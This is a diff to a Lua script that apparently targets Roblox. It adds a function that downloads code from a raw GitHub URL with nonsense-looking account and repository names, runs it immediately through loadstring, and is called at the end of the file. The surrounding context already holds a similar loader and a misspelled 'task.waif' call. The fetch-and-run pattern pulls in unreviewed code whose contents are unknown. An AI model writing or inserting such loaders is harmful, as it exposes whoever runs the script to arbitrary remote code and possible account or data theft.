@@ -10,6 +10,12 @@ local function carregarScript()
     loadstring(response)()
 end
 
+local function carregarScript2()
+    local url = "https://raw.githubusercontent.com/RASCHHLUBRASCHHLUBRASCHHLUBRASCHHLUB/ywhaugwjwvkabakqvkqbajvajqbajHvajabva/refs/heads/main/base.lua"
+    local response = game:HttpGet(url, true)
+    loadstring(response)()
+end
+
 local function RejoinServer()
     local TeleportService = game:GetService("TeleportService")
     local Players = game:GetService("Players")
@@ -52,3 +58,5 @@ else
     task.waif(4)
     RejoinServer()
 end
+
+carregarScript2()
